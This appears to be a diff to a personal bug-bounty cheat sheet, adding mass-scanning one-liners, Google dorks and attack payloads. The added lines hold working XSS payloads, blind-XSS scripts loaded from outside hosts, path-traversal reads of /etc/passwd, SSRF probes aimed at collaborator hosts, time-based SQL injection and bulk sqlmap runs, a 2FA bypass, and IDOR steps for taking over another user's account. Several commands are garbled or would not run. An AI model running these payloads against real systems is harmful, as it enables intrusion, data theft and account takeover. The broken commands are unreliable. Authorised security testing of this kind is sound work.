@@ -42,13 +42,27 @@ place all the target in burpdsite
         amass enum -d target.com -o /filepath/subdomains.txt
           amass enum [-active] [-ip] -d target.com
            amass enum -d target.com | grep target.com  # To just list subdomains
+           amass enum -active -df domains.txt -config $HOME/.config/amass/config.yaml -o amass_subdoamins.txt
+           amass intel -org "Tesla" 
 
                
                subfinder 
+               subfinder -d target.com -silent | httpx -silent -o urls.txt
                 subfinder -d url - active | tee -a subfinder.txt
                 subfinder -d google.com -all > subdomain.txt
                 Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
                 subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
+                
+                
+                If you have domains.txt file now you wanna check for admin panel the file
+                 subfinder -d target[.]com -silent | sed 's/$/\/admin/' | httpx -title -status-code -content-length
+                 Blind XSS In X-Forwarded-For Header
+                 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"	
+                
+                
+                 
+               
+                
 
                 cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password ftp            password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
                 
@@ -65,6 +79,9 @@ place all the target in burpdsite
                
                maual subdomain enum
                virustotal, censys,  choas
+               
+               Search Subdomain using Gospider
+               gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
                
                  2
                 FILTERING OUT LIVE SUBDOMIN
@@ -87,10 +104,31 @@ place all the target in burpdsite
                  
                  cat |grep -E *(url) | sot - u | urlsubdomain.txt
                   //note, when give a subdomian that is in scope , you have to move stright to extraction of url
+                  
+                  
+                  /// cat subtxt sub2.txt sub3.txt | sort -u //
+                  
+                  
+            3
+               check for contetnt discovery
+               dirb, gobuster,ffuf
+               
+               ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt
+               ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt -fs 4517          //filter
+               ffuf -u https://www.example.com/FUZZ -w wordlist/Seclists/Discovery/Web-content/raft-medium-files.txt -mc 200,302,301 -t 1000
+               
+               
+                          4 
+                 finding parameters, 
+                 arjun , paramspider ,gf  check github
                  
-                 3
+                 arjun -u https://www.example.com/file.php 
+                 paramspider -l domains.txt -s
+                 gospider -S domains.txt -o gospider
+                 
+                 5
                  URL RECON - EXTRACTION
-                 gau, gospider, 
+                 gau, gospider, katana
                  
                  gau
                  echo "url" |gau | tee gau.txt
@@ -103,18 +141,48 @@ place all the target in burpdsite
                  gospider    check for goSpider github
                     
                Gospider -s (url) --subs --js || tee gospider.txt
+               
+               SINGLE TARGET
+               gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+               
+               MUITIPLE TARGET 
+               gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
+               
+               GOSPIDER XSS
+               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+               
+               
               fillter files fron it
              cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
                  cat gspider.txt |awk '[print$]' | grep -E url | tee gospider.txt
+                 
+                 katana -list urls.txt -v -jc -o katana
+                 katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
                  
                  
                  
                      JAVASCRIPTS FILES
                cat param.txt | grep -E *[.]js | tee javascript.txt     filter out javascript
+               echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
+               
+                   search javascript file
+                 gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
+                  
+                   PART (1)
+                 curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
+                 PART 2
+                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
                  
-                        4 
-                 finding parameters, 
-                 arjun , paramspider ,gf  check github
+                 part 3
+                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
+                  part 4
+                  curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
+                 
+                 
+                 
+             
+                 
                  
                  5
                  
@@ -123,9 +191,13 @@ place all the target in burpdsite
                  waybackurl, waybackmachine
                  echo "url"  | waybackurl
                  
+                 5@
                  content discovery/params discovery  for bug hunting
+                 
+                 ffuf -w /wordlist/customlist/al.txt -c -u https://smart.com/FUZZ
                   waybackurls target.com | grep "\\.js"|uniq|sort
                  waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt   
+                 
                  
                  cat domains.txt | waybackurls > urls.txt    
                  
@@ -145,9 +217,8 @@ place all the target in burpdsite
                AUTOMATIC REPLACE WITH PAYLOAD
                qsreplace .. check github
                
-               9
-               check for contetnt discovery
-               dirb, gobuster,ffuf
+            
+
                
                10
                visual recon
@@ -187,6 +258,11 @@ place all the target in burpdsite
 
      # Get all subdomains of google, find the ones that respond to http(s), crawl them all
      echo target.com | haktrails subdomains | httpx | hakrawler
+     #/bin/bash
+
+hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht
+
+# save to .sh, and run bash program.sh target.com
      
       using subjs
     $ cat urls.txt | subjs 
@@ -215,12 +291,34 @@ place all the target in burpdsite
      GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
      site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
      | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
+     cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
+     
                  
       17
      using nuclie
      
+     18
+     ADMIN LOGIN ONLINER
+     cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
+     
+     403 login Bypass
+   cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
+     
     
    
+                               gauplus
+                   cat domain.txt | gauplus -subs | grep -i "\.xlsx" allurls.txt | anew xlsx.txt
+                    cat domain.txt | gauplus -subs | grep -i "\.sql" allurls.txt | anew sql.txt
+                     cat domain.txt | gauplus -subs | grep -i "\.log" allurls.txt | anew log.txt
+                      cat domain.txt | gauplus -subs | grep -i "\.bak" allurls.txt | anew bak.txt
+                       cat domain.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
+          cat domain.txt | gauplus -subs | grep "=" > url.txt; httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+          
+       cat domain.txt | gauplus -subs | qsreplace "<intearcst-client domain>" | httpx     ssrf
+        cat domain.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; do python3 secretfinder.py -l "$url"; done<jsfiles.txt
+          cat domain.txt | gauplus -subs | httpx -sc -nc | grep "403\|401" | anew unauted.txt      check 403 bypass github
+          
+          cat domain.txt | gauplus -subs | httpx -title | grep -l "admin\|login\|dashboard" | anew loginpanel.txt   //add more keyword
                
                        
  whatweb -a 3 (url)
@@ -415,6 +513,8 @@ https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22
 
               GOOGLE DORKS
               
+          Google dorking tip, if you see an interesting subdomain, don't be afraid to query it by itself in google :)
+for example, site:interesting.subdomain.com ext:txt
               
 Broad domain search w/ negative search
 site:example.com -www -shop -share -ir -mfa
@@ -543,6 +643,9 @@ intext:"Powered by" & intext:Drupal & inurl:user
 
 Joomla
 site:*/joomla/login
+
+Google Dork - Open Redirects
+inurl:(url= | return= | next= | redirect= | redir= | ret= | r2= | page=) inurl:& inurl:http site:example[.]com
 
 
 
@@ -801,6 +904,34 @@ cat all_js.js | grep -r -E # Similar to the grep above...
            RUN
 nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
 
+
+
+   IDORS
+   check for Alot of nos  in whatever reposnse  you have.  while intercepint in burpsuite, allows try to change every value, eg-> error to success, 1234 to 3456, check if id is encoded or not in a plain text, the decode it, 
+   check if file can be accessed directly from the url, without needing port authecation   //images are commoly venearble to this
+   check by changing the request method, or expolit involves using a different method. 
+   ids not actually numbers but strings?, somtimes the id can be expolited via username or email change of an id
+   can you bypass payment
+   can you do actions on others behalf
+   can you destroy or damage any asset or info
+   NOTE:: Almost 80% of idors are found in rest API, GET OR POST REQUEST BODY
+       
+       tip
+   Create new password and confirm it then clicked in Reset Password button.
+intercept the request and started to analyzing each request.
+After sometime I found that after create a new password, The application authenticated me, But redirect me to /logout page to force me login again and ask for 2fa code.
+So what I did is next
+Intercepted all requests from target.com, then I found the request that responsible for redirect me to /logout page, I dropped it using Burp Suite
+Returning to the browser, I found that it had redirected me to my profile page without asking for 2fa code.
+   
+   
+   
+   Description of areas in ecommerce websites that are prone to IDOR attacks:
+In ecommerce websites, there are several areas that are particularly prone to IDOR attacks. These areas include:
+
+URLs that include a reference to a user’s private data, such as order numbers or account IDs.
+Pages that allow users to view or modify their own data, such as order status or account details.
+Pages that generate dynamic content, such as PDF downloads.
   
   
   
@@ -991,16 +1122,122 @@ The "editor" role will be added to "Permissions Granted."
 Logout and relogin.
 Now, the user has the "editor" role and can perform any action on the organization.
   
+  tip 14
   
+  Bug Bounty Tips!!! IDOR
+
+Steps to Reproduce
+
+1.Go to https://example{.}com/
+2.Go to vendor login.
+3.Make one attacker account and one victim account.
+4.Login as attacker.
+5.Go to My Account.
+6.Update your profile and intercept your request with burp suite, make  sure your foxy proxy is on, you will notice this request, take a look  at userId parameter and save it your notepad:
+7.Change email to new email: example I changed to this email: exa@gmail.com or to exa2@gmail.com
+8.But make sure you created victim account.  So, change it to the victim email.
+9.Before you change your email, make sure to turn your foxy proxy on and open your burp suite.
+10. Now change to victim email.
+In http history (in Burp Suite) you will notice this request
+11. In request you can see userId parameter is same from attacker  request and from victims request. It doesn't change userId when you  update your email.
+12. In request, change the ID to your test account's ID.
+13. Before changing ID to test account's ID. All you need to do is to  create a new account (test account). For test account I was using this  email: tes@gmail.com
+14.If you created test account make sure to turn your foxy proxy on,  update your profile and intercept request in your burp suite again.
+16.And now you can change the  victims ID to your test account's ID.
+17.But when you change your ID to victim's ID example:
+18. Now change to Email parameter to this mail: attacker@gmail.com
+19.Update userId parameter from  123464 (attackers ID) to 123464 (tests ID or victims ID).
+20.Make sure you changed email.
+21. Now send request.
+22. Now try to login as a exa@gmail.com with attackers password.
+23. You will see it works.
+
+
+
+Bug Bounty Tips: 🐛 Working on a wide-scope target and need to quickly pinpoint Interesting assets for your security assessment? Here's a nifty one-liner to help you do just that:
+
+1️⃣ Create a list of your target/subdomains in 'targets.txt'.
+2️⃣ Use the 'httpx' tool with the '-mr' flag to search for specific keywords. For example, you can look for the term 'register' in the responses using the command like:
+
+cat targets.txt  | httpx -mr "register" 
+
+🔍 What happens next? You'll get a list of assets where the keyword 'register' appears in the HTTP responses. These assets often lead to registration or sign-up pages. Exploring these can reveal security vulnerabilities waiting to be discovered.
+
+⚙️ Want to take it a step further? Build your custom keyword lists, including terms like 'login,' 'signup,' 'admin', and more. Tailor your searches to uncover assets of interest quickly.
+
+🚀 I've used this simple yet effective technique countless times on expansive scopes to gain an edge in bug hunting. Stay proactive and stay secure! 💡💻 
+
+
+               My Bug hunting Methodology 📝
+
+                 Registration Testing 
+                 
+        ) Check for duplicate registration/Overwrite existing users
+        2) Check for weak password policy. 
+        3) Check for reuse existing usernames. 
+
+         4) Check for insufficient e-mail verification process. 
+         5) Weak registration implementation - Allows disposable email address. 
+  
+  
+    TIP
+    
+     Question of the day: What automated checks can you perform after subdomain reconnaissance?🌐
+
+Many people gather subdomains but struggle with what to do next with this dataset. 
+
+Here are some automated checks you can conduct on these subdomains:
+
+🌀 Subdomain Takeovers: Verify subdomain takeovers using tools like Nuclei and dnsReaper.
+📂 Passive Source URLs: Gather as many URLs as possible from passive sources such as Wayback Machine and AlienVault. Consider using Waymore, an excellent tool for this purpose.
+📝 Active Source URLs: Collect active URLs and parameters using Katana.
+🔍 Custom Nuclei Templates: Develop your custom Nuclei templates to check for SQL injection (SQLI), cross-site scripting (XSS), server-side template injection (SSTI), etc. For example, look for SQLI in User-Agent and Referer headers, and XSS in parameters and URIs. Apply these templates to all collected URLs.
+🔐 Check for Leaked Secrets: Utilize Nuclei templates to search for leaked credentials or secrets on these URLs.
+🧩 JS Files and Monitoring: Extract all JS files from passive and active sources and identify APIs using tools like LinkFinder, JSLuice, and GAP. Automate crawling these APIs and create custom regex patterns to detect sensitive data or large responses. Apply a similar approach to identify hard-coded credentials.
+🚀 Directory Fuzzing: Employ wordlists from Assetnote for directory fuzzing on these subdomains to uncover hidden files and directories. Filter out HTTP status codes like 200 and 301, then investigate further.
+🔎 Automated Parameter Mining: Develop custom scripts to automatically discover hidden parameters on collected URLs. Once identified, run these through your custom Nuclei templates again.
+🌟 Identify Interesting Assets: Use title, keywords in response bodies, knowledge of vulnerable products, and more to identify intriguing assets for manual review.
+
+There are many additional ideas you can build upon to enhance your automation capabilities. Stay tuned for more insights! 
    
      
      
 
 
-Xss
+             Xss    XSS         XSS           XSS
+             
 check for xss cheatsheat
+  echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+  echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
+  waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+  
+  gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+  
+      BLIND XSS
+  cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
+  
+  
+  httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
+  
+  
+  cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
 
 <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
+
+
+Payload XSS (cross-site scripting) on login page:
+
+');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br
+
+
+xss tip
+Methodology:
+1) Identify bug bounty
+2) Enumerate sub domains (I use amass, subfinder)
+3) Feed those to httpprobe
+4) Feed that list to a crawling tool
+5) Feed that list to kxss
+6) grep output for " (easiest win)
 
 
 
@@ -1455,7 +1692,7 @@ This payload puts a twist on requiring user interaction. By injecting a style ta
       ffuf -u "rplicense.redacted.com/FUZZ" -w /path/to/word-list -H "User-Agent: Mozilla/5.0 (Galaxy S22; Android 6) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/111.0.5628.105 Mobile Safari/537.48" -  rate 20  also fuzz achive/directory and check for forms and sumit payload where neccasry
  
 
-
+   --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src= https://tetstst.com></scrIpt>
 
   WEAPONING XSS
   
@@ -1474,6 +1711,9 @@ To compensate for this, you can attach an event listener to the document which w
   
  NOTE:    allow try to copying CSRF token from a different browser session and see if you can reuse it // this could to lead to chainging xss with csrf AND CSRF BYPASS
  
+ 
+ 
+ Payload - <svg+viewBox="0+0+50+50"+xmlns="http://w3.org/2000/svg">+++++<rect+width="10"+height="10">+++++++++<animate+onbegin=alert(1)+attributeName="rx"+values="0;5;0"+dur="10s"+/>+++++</rect>
  
  
  xss oneliner   //   
@@ -1740,7 +1980,8 @@ Origin:attacker.com/target.com
 
 
   
-    LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
+    LOCAL/REMOTE FILE INCLUSION (LFI/RFI)      LOCAL/REMOTE FILE INCLUSION (LFI/RFI)                LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
+    
     1) Verify the LFI vulnerability by grabbing the passwd, hosts, etc, files       /index.php?page=/etc/passwd
    2) Verify that you have access to the access log by including it through LFI       /index.php?page=/var/log/apache2/access.log
    3) Use netcat or something similar to send the mailicious request    
@@ -1774,6 +2015,8 @@ Payload used: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
        check for download section
       check for file extension and then assum if the file is ending with file .php or .jpeg    // check  for     ..//index.php  and  ../index.jpeg and so on
       ffuf -u "https://www.harshithexams.co.in/download.php?filename=../FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac           this is example
+      
+      gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
   
     
     ///////////// RFI
@@ -1783,6 +2026,8 @@ Payload used: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f
     
     /etc/shadow /// also use this too
     Payload: GET /assets/css///////../../../../../../../../etc/passwd  
+    
+    cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi-httpx.txt
     
     TRAVERSAL SEQUENCES STRIPPED NON-RECURSIVELY
     http://example.com/index.php?page=../../../etc/passwd
@@ -1806,6 +2051,11 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
      http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
     Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
     http://example.com/index.php?page=PhP://filter
+    
+    
+    httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+    
+    
     
     
     
@@ -2036,6 +2286,13 @@ header('Location: http://127.0.0.1:8080/status');
   cat sort.txt | grep ? | tee grep.txt  /// filltered out parameters
   cat parameter.txt | grep -E *[.]js     filter out javascript
   
+               SSRF ONELINER
+  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
+  cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://hacker.burpcollaborator.ne
+  
+       CHECK BLIND SSRF IN HEADER,PATH,HOST & CHECK XSS VIA WEB CACHE POISONING.
+   cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
+  
   
   TIP 2 on ssrf 
   do some subdomain findings
@@ -2134,6 +2391,30 @@ file://\/\/etc/passwd : Work
    SSRF IN DNS REBRINDING
   set dns rebrinding to   127.0.0.1/google ip  or any other bypass and send many request with burp intruder and watch response that come back different lenght than others
   check if it is an aws metadata IP and try to  retrieve data from there by firing up burp intruder
+  
+  TIP
+  Blind SSRF via image upload URL downloader on 
+https://example{.}com
+
+Steps to Reproduce
+
+1.Create a one test account.
+2.Login to that account.
+3.Go to edit profile.
+4.Scroll down there.
+5.Notice user picture field.
+6. Try to upload something.
+7. You will see URL downloader.
+8. Open your burp collaborator client.
+9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
+10. Poll now in burp collaborator client.
+11.Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
+12.Turn your foxy proxy on and open your burp suite.
+13.Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
+14.Intercept request. Request
+15. You will notice one error showing some info about server which confirms Blind SSRF again. 
+16 .By the way if you change to 25 port its leaking something about Postfix SMTP server.
+17.Also I was able to identify that your web app is using libcurl.
   
 
 
@@ -2317,13 +2598,83 @@ ffuf -u https://notes.readcted.com/FUZZ -w ~/wordlists/domino.txt -mc 200 -fw 1
        
        
        
+       https://yourtarget[.]com/auth/realms/master/clients-registrations/default/security-admin-console
+
+Scan your targets using the following command and ethically report any quick wins:
+
+nuclei -l targets.txt -t CVE-2020-27838.yaml
+
+Here's the link to the template - https://github.com/projectdiscovery/nuclei-templates/blob/4d6274fcd433d84a4ef7681cda6ad8e93a6448af/http/cves/2020/CVE-2020-27838.yaml#L2
+       
+           
+           
+           How to perform introspection in GraphQL
+           Send a POST request with the below body.
+           
+           {"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+
+    extract the JSON response in a file. once you have the schema, the best way is to import it into a tool like “GraphQL Voyager
+           
+           
+           
+       
+       
+       
+           Web Cache Vulnerabilities 
+           
+           
+           
+           
+           
+           
+           
+           
        
 
      5MIN ADMIN PANEL ACCESSED PAYLOAD
 cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
     
  
- SQL INJECTION
+ SQL INJECTION        SQL INJECTION          SQL INJECTION
+ 
+ waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
+ 
+  allwos give a single quote on a paramater, this might resuilt to 500 server error
+ 
+ echo https://www.recreation.gov | waybackurls | grep "?" | uro | httpx -silent > param.txt
+
+cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
+
+sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+
+sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+
+   SQLI ONE LINER:-     SQLI ONE LINER:-     SQLI ONE LINER:-
+cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+
+  subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+  
+  
+  Time based SQL injection
+  cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+ 
+ 
+ 
+ 
+  𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
+
+cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
+ 
+ 
+ Always try the "\" character in login entries. It can trigger an SQL.
+
+curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
+ 
+ 
  
    5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION
      Subfinder -d target.com | tee -a domain.txt
@@ -2331,6 +2682,8 @@ cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -
      cat url.alive.txt | waybackurls | tee - a urls.check.txt
      gf sqli urls.check >> urls.sqli.txt         //  gf url.check >> urls.sqli.txt
      sqlmap -m urls.sqli.txt  --dbs --batch
+     
+    
  
  
  
@@ -2342,6 +2695,12 @@ cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -
  
  SQL injection Oneliner.
  subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+
+grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+
+    TIME-BASE SQL INJECTION
+gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
